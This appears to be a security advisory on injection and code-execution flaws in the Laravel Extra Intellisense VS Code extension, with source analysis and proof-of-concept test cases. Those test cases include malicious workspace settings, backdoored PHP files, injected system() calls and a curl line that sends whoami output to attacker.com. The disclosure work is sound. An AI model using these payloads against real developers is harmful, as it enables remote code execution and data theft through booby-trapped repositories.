# Laravel Extra Intellisense Security Vulnerabilities

## Command Injection via phpCommand Configuration

### Vulnerability Name
Command Injection via phpCommand Configuration

### Description
The Laravel Extra Intellisense extension uses a user-configurable `phpCommand` setting to determine how PHP code is executed. This command template is directly used in a call to `child_process.exec()` with insufficient validation or sanitization. A threat actor could trick a user into setting a malicious phpCommand configuration that includes command injection payloads.

Step by step exploitation:
1. Attacker creates a malicious Laravel repository with a `.vscode/settings.json` file containing a crafted phpCommand value
2. When the victim opens the project, VSCode applies these workspace settings
3. The extension uses this malicious command template when calling `Helpers.runPhp()`
4. Shell commands embedded in the phpCommand are executed

The vulnerability exists in the `runPhp` method in `helpers.ts` which uses Node.js's `child_process.exec` to run commands constructed from user-controlled configuration:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");  // Only escapes double quotes
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");  // Only handles dollar signs on Unix
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);  // Constructs the shell command

    // Executes the shell command
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        function (err, stdout, stderr) { /* ... */ }
    );
}
```

### Impact
This vulnerability allows command execution on the victim's system with the same privileges as the VSCode process. An attacker can execute arbitrary code with the privileges of the VS Code process on the victim's machine. This could lead to complete system compromise, including:
- Data theft
- Installation of malware
- Persistence on the system
- Lateral movement in the network

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension attempts to escape quotes and dollar signs, but the implementation is insufficient. There's no comprehensive input validation or sanitization of the PHP code before execution. The README file mentions a security note, but it doesn't explicitly warn about this specific vulnerability.

### Missing Mitigations
1. No validation of the phpCommand format
2. No confirmation prompt when a workspace tries to set custom phpCommand values
3. No sandboxing or isolation for command execution
4. Whitelist approach for allowed command patterns
5. Sandbox execution of external commands
6. Clear warning in the security note section about the risks of opening unknown projects
7. Proper sanitization and validation of PHP code before execution
8. Use of safer execution methods that don't involve shell commands

### Preconditions
- Victim must have the Laravel Extra Intellisense extension installed
- Victim must open a project with a malicious `.vscode/settings.json` file
- VSCode must be configured to apply workspace settings (default behavior)

### Source Code Analysis
The vulnerability is in the `helpers.ts` file's `runPhp` method:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Execute the command
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        // Callback function
    );
}
```

The issue is that the extension gets the `phpCommand` configuration value directly from VSCode settings without proper validation, and then uses it in a call to `cp.exec()`. The configuration can come from user settings or workspace settings.

The escaping logic only replaces double quotes once and doesn't properly handle nested escape sequences. This can be exploited to break out of the PHP code context.

### Security Test Case
To prove this vulnerability:

1. Create a malicious Laravel repository:
   ```bash
   mkdir -p malicious-laravel/{vendor,bootstrap,app/Http/Controllers,.vscode}

   # Create minimal required files
   touch malicious-laravel/vendor/autoload.php
   touch malicious-laravel/bootstrap/app.php
   touch malicious-laravel/artisan

   # Create malicious .vscode/settings.json with command injection
   echo '{
     "LaravelExtraIntellisense.phpCommand": "php -r \\"{code}\\" & calc.exe"
   }' > malicious-laravel/.vscode/settings.json
   ```

2. For Linux targets, use:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "bash -c \"touch /tmp/pwned && php -r \\\"{code}\\\"\""
   }
   ```

3. Host this malicious project on a public Git repository
4. Send the repository URL to the victim
5. When the victim opens the repository in VSCode with Laravel Extra Intellisense installed
6. The extension will apply the workspace settings, including the malicious phpCommand
7. When the extension executes PHP code, the injected command will also run

8. Expected result:
   - When the extension runs a PHP command, the calculator application should launch (Windows) or a file will be created (Linux)
   - This demonstrates successful command injection through the phpCommand setting

## Path Traversal/Code Injection via basePath and basePathForCode Settings

### Vulnerability Name
Path Traversal via basePath and basePathForCode Settings

### Description
The extension allows configuration of `basePath` and `basePathForCode` settings which are used when building file paths for inclusion in PHP code. These settings can be manipulated in a malicious repository's `.vscode/settings.json` file to cause the extension to include files from outside the intended project directory.

In the `projectPath` method of `helpers.ts`, the extension processes these settings and uses them to construct file paths:

```typescript
static projectPath(path:string, forCode: boolean = false) : string {
    if (path[0] !== '/') {
        path = '/' + path;
    }

    let basePath = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePath');
    if (forCode === false && basePath && basePath.length > 0) {
        if (basePath.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
            basePath = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePath);
        }
        basePath = basePath.replace(/[\/\\]$/, "");
        return basePath + path;
    }

    let basePathForCode = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePathForCode');
    if (forCode && basePathForCode && basePathForCode.length > 0) {
        if (basePathForCode.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
            basePathForCode = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePathForCode);
        }
        basePathForCode = basePathForCode.replace(/[\/\\]$/, "");
        return basePathForCode + path;
    }
    // ...
}
```

If an attacker can manipulate the path returned by `projectPath` (by manipulating the `basePathForCode` configuration setting), they could inject PHP code by breaking out of the string literal with a single quote.

### Impact
An attacker can force the extension to include arbitrary PHP files from the victim's file system when executing PHP code. This could lead to:
- Information disclosure (the content of sensitive PHP files could be parsed and exfiltrated)
- Execution of malicious code if the included PHP files contain code that would be harmful when executed
- Potential bypass of security restrictions in the victim's environment
- Arbitrary PHP code execution within the context of the PHP interpreter

### Vulnerability Rank
High

### Currently Implemented Mitigations
The code does resolve relative paths that start with `.`, but there's no validation to prevent setting absolute paths that point outside the project directory.

### Missing Mitigations
1. Validation to ensure the path doesn't traverse outside the project directory
2. Restrict basePath and basePathForCode settings to relative paths only
3. Implement a sandbox or container for executing PHP code
4. Prompt for confirmation when basePath points outside of the project directory
5. Proper escaping of file paths before concatenation into PHP code
6. Use of prepared statements or parameter binding for PHP code execution
7. Validation of path inputs against a whitelist of allowed paths

### Preconditions
1. The victim must have the Laravel Extra Intellisense VS Code extension installed
2. The victim must open a malicious Laravel project in VS Code
3. The malicious project must contain a `.vscode/settings.json` file with manipulated `LaravelExtraIntellisense.basePath` or `LaravelExtraIntellisense.basePathForCode` settings

### Source Code Analysis
In `helpers.ts`, the `projectPath` method uses the configured `basePath` or `basePathForCode` setting to construct the full path:

```typescript
static projectPath(path:string, forCode: boolean = false) : string {
    if (path[0] !== '/') {
        path = '/' + path;
    }

    let basePath = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePath');
    if (forCode === false && basePath && basePath.length > 0) {
        if (basePath.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
            basePath = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePath);
        }
        basePath = basePath.replace(/[\/\\]$/, "");
        return basePath + path;
    }

    let basePathForCode = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePathForCode');
    if (forCode && basePathForCode && basePathForCode.length > 0) {
        if (basePathForCode.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
            basePathForCode = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePathForCode);
        }
        basePathForCode = basePathForCode.replace(/[\/\\]$/, "");
        return basePathForCode + path;
    }
    // ...
}
```

This method is then used in `runLaravel` to include PHP files:

```typescript
"require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
"$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';"
```

If `basePathForCode` is set to something like `'); system('malicious command'); //`, the constructed PHP code would become:
```php
require_once ''); system('malicious command'); //path/to/vendor/autoload.php';
```
This would execute the malicious command.

### Security Test Case
1. Create a malicious Laravel project structure with a basic Laravel installation
2. Add a `.vscode/settings.json` file with the following content (for Windows):
```json
{
  "LaravelExtraIntellisense.basePathForCode": "C:/",
  "LaravelExtraIntellisense.phpCommand": "cmd.exe /c echo File content: && type C:\\Windows\\System32\\drivers\\etc\\hosts && php -r \"{code}\""
}
```
3. For Linux targets, use:
```json
{
  "LaravelExtraIntellisense.basePathForCode": "'); system('curl -s http://attacker.com/exfil?data=$(whoami)'); // ",
  "LaravelExtraIntellisense.phpCommand": "bash -c \"echo File content: && cat /etc/passwd && php -r \\\"{code}\\\"\""
}
```
4. Host this malicious project on a public Git repository
5. Send the repository URL to the victim
6. When the victim clones and opens the project in VS Code with the Laravel Extra Intellisense extension enabled, the extension will attempt to include files from the root directory
7. The attacker's modified command will also display sensitive file content, demonstrating the ability to access files outside the project directory

## Remote Code Execution via Malicious Laravel Repository

### Vulnerability Name
Remote Code Execution through Malicious Laravel Project Files

### Description
The Laravel Extra Intellisense VSCode extension loads and executes code from the user's Laravel project to collect data for providing autocomplete functionality. The extension uses `child_process.exec()` to run PHP code that bootstraps the Laravel application by requiring project files such as `vendor/autoload.php` and `bootstrap/app.php`. If these files contain malicious code, it would be executed with the same privileges as the VSCode process.

Step by step exploitation:
1. Attacker creates a malicious Laravel repository with backdoored PHP files
2. Victim clones/downloads this repository and opens it with VSCode
3. The Laravel Extra Intellisense extension automatically starts analyzing the project
4. When the extension calls `Helpers.runLaravel()`, it loads and executes malicious code from the repository
5. The malicious code executes in the context of VSCode, gaining access to the user's system

### Impact
This vulnerability allows for arbitrary code execution on the victim's machine with the privileges of the VSCode process. An attacker could:
- Access, modify, or delete files on the victim's system
- Steal sensitive information, credentials, or tokens
- Install persistent backdoors or additional malware
- Pivot to other systems on the victim's network

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension includes a security note in the README that warns users about the extension running the Laravel application automatically and periodically. It also mentions disabling the extension when writing sensitive code in service providers.

### Missing Mitigations
1. No sandbox or isolation for PHP code execution
2. No validation or verification of the Laravel project structure before execution
3. No limiting of capabilities or permissions when executing external code
4. No option to prompt the user before executing code from a newly opened repository

### Preconditions
- Victim must have the Laravel Extra Intellisense extension installed in VSCode
- Victim must open a malicious Laravel repository with VSCode

### Source Code Analysis
The vulnerability originates in the `helpers.ts` file, particularly in the `runLaravel` and `runPhp` methods:

1. In `helpers.ts`, the `runLaravel` method constructs a PHP code block that includes files from the Laravel project:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    // ...
    var command =
        "define('LARAVEL_START', microtime(true));" +
        "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
        "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
        // ... more code
    // ...
    self.runPhp(command, description)
    // ...
}
```

2. The `runPhp` method takes this code and executes it using `child_process.exec`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    // Some escaping logic for different platforms
    // ...
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Execute the command
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        // Callback handling
    );
}
```

3. The extension loads various project files, including:
   - `vendor/autoload.php` - PHP's dependency autoloader
   - `bootstrap/app.php` - Laravel's application bootstrap file
   - Various other project-specific files based on provider needs

4. When the extension is activated in `extension.ts`, it initializes multiple providers:

```typescript
context.subscriptions.push(vscode.languages.registerCompletionItemProvider(LANGUAGES, new RouteProvider, ...TRIGGER_CHARACTERS));
context.subscriptions.push(vscode.languages.registerCompletionItemProvider(LANGUAGES, new ViewProvider, ...TRIGGER_CHARACTERS));
// More providers...
```

5. Each provider calls `Helpers.runLaravel()` with PHP code to extract data:

```typescript
// Example from ConfigProvider.ts
Helpers.runLaravel("echo json_encode(config()->all());", "Configs")
```

Since the extension executes PHP code from the project, any malicious code in the project files will be executed when the extension runs.

### Security Test Case
To prove this vulnerability:

1. Create a malicious Laravel repository:
   ```bash
   # Create basic Laravel structure
   mkdir -p malicious-laravel/{vendor,bootstrap,app/Http/Controllers}

   # Create malicious vendor/autoload.php
   echo '<?php
   // Malicious payload
   if (PHP_OS_FAMILY === "Windows") {
     exec("powershell -Command \"Start-Process calc.exe\"");
   } else {
     exec("open -a Calculator");  // For macOS
     exec("gnome-calculator");    // For Linux
   }

   // Return empty array to prevent further errors
   return [];
   ?>' > malicious-laravel/vendor/autoload.php

   # Create minimal bootstrap/app.php
   echo '<?php
   return new stdClass();
   ?>' > malicious-laravel/bootstrap/app.php

   # Create artisan file (needed for extension activation)
   echo '<?php // Empty artisan file' > malicious-laravel/artisan
   ```

2. Have the victim:
   - Clone/download the malicious repository
   - Open it with VSCode with Laravel Extra Intellisense extension installed
   - The calculator app should open automatically, demonstrating code execution

3. Expected result:
   - When VSCode opens the repository, the Laravel Extra Intellisense extension activates
   - The extension calls `Helpers.runLaravel()` to analyze the project
   - The malicious code in `vendor/autoload.php` executes
   - The calculator application opens, demonstrating successful code execution

Note: In a real attack, instead of launching a calculator, an attacker would likely install a backdoor, exfiltrate sensitive data, or perform other malicious actions.

## Remote Code Execution through PHP Execution in Model Loading

### Vulnerability Name
Remote Code Execution through PHP Execution in Model Loading

### Description
The extension automatically loads and executes PHP code from the Laravel project without proper validation. When examining Model files, it includes and executes them to gather information for intellisense features. This allows an attacker to craft a malicious model file that will be executed automatically when the extension scans files during extension activation or when the user triggers autocompletion.

### Impact
An attacker can execute arbitrary PHP code on the victim's machine, potentially leading to exfiltration of sensitive information, backdoor installation, or further command execution using PHP functions like `system()` or `exec()`.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
Limited to running the PHP code in the context of the Laravel application, which still allows code execution.

### Missing Mitigations
- Static analysis of PHP files before execution
- Sandboxing PHP execution
- Explicit user consent before loading model files
- Allow-list of safe PHP operations

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a repository containing malicious PHP model files

### Source Code Analysis
In `EloquentProvider.ts`, the `loadModels` method contains code that is vulnerable to RCE:

```typescript
loadModels() {
    var self = this;
    try {
        Helpers.runLaravel(
            "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
            "   if (is_dir(base_path($modelPath))) {" +
            "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
            "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
            "             include_once base_path(\"$modelPath/$sourceFile\");" +  // Includes and executes PHP files from the project
            "         }" +
            "      }" +
            "   }" +
            "}" +
            // More code that processes the models...
        );
    } catch (exception) {
        console.error(exception);
    }
}
```

This code scans directories specified in the 'modelsPaths' configuration (defaulting to 'app' and 'app/Models'), and for each PHP file found, it includes and executes it. This means that any PHP code in these files will be executed when the extension loads models, which happens automatically during initialization.

The actual execution happens in the `runLaravel` method in `helpers.ts`, which executes PHP code in the context of the Laravel application:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // More Laravel bootstrapping code...
            code +  // The provided PHP code is injected here
            // More code...

        return new Promise(function (resolve, error) {
            self.runPhp(command, description)  // Executes the PHP code
            // ...
        });
    }
    return new Promise((resolve, error) => resolve(""));
}
```

### Security Test Case
1. Create a malicious Laravel project
2. Add a malicious model file at `app/Models/Exploit.php`:
```php
<?php
namespace App\Models;

// This code will be executed automatically when Laravel Extra Intellisense scans models
$payload = "<?php system('id > /tmp/rce_success'); ?>";
file_put_contents('/tmp/exploit.php', $payload);
system('php /tmp/exploit.php');

class Exploit extends \Illuminate\Database\Eloquent\Model
{
    // Normal-looking model code to avoid suspicion
    protected $table = 'exploits';
    protected $fillable = ['name'];
}
?>
```
3. Commit the project to a repository
4. Send the repository URL to the victim
5. When the victim opens the project in VSCode with Laravel Extra Intellisense extension, the extension will automatically scan and load model files
6. Verify that the file `/tmp/rce_success` contains the output of the `id` command, proving successful code execution

## Code Injection via PHP String Concatenation

### Vulnerability Name
Code Injection via PHP String Concatenation

### Description
The extension builds PHP code by concatenating strings without proper sanitization or escaping of user-controlled values from configuration settings. This allows an attacker to inject malicious PHP code that will be executed when the extension runs its various provider methods.

### Impact
An attacker can execute arbitrary PHP code on the victim's machine, allowing access to the file system, network, or other system resources available to the PHP process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The code directly concatenates configuration values into PHP code strings.

### Missing Mitigations
- Proper validation and sanitization of configuration values
- Use of parameterized approaches instead of string concatenation
- Isolation of user-controlled values from executable code

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a repository with a customized configuration

### Source Code Analysis
Multiple provider files construct PHP code by string concatenation. For example, in `EloquentProvider.ts`:

```typescript
Helpers.runLaravel(
    "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
    // More PHP code construction...
);
```

The `modelsPaths` configuration value is directly concatenated into the PHP code. If an attacker can control this value, they could potentially break out of the string context and inject their own PHP code.

In `MiddlewareProvider.ts`, `loadMiddlewares()` concatenates PHP code without proper escaping:

```typescript
Helpers.runLaravel(
    "$middlewares = array_merge(app('Illuminate\\Contracts\\Http\\Kernel')->getMiddlewareGroups(), app('Illuminate\\Contracts\\Http\\Kernel')->getRouteMiddleware());" +
    // More PHP code...
);
```

### Security Test Case
1. Create a malicious Laravel project with a `.vscode/settings.json` file containing:
```json
{
  "LaravelExtraIntellisense.modelsPaths": ["app/Models', ']; system('touch /tmp/code_injection_success'); $x = '"]
}
```
2. The code above breaks out of the string context in the PHP code constructed in `EloquentProvider.ts`
3. Commit the project to a repository
4. Send the repository URL to the victim
5. When the victim opens the project in VSCode and the extension activates, it will construct and execute PHP code with the injected malicious command
6. Verify that the file `/tmp/code_injection_success` was created, proving successful code injection
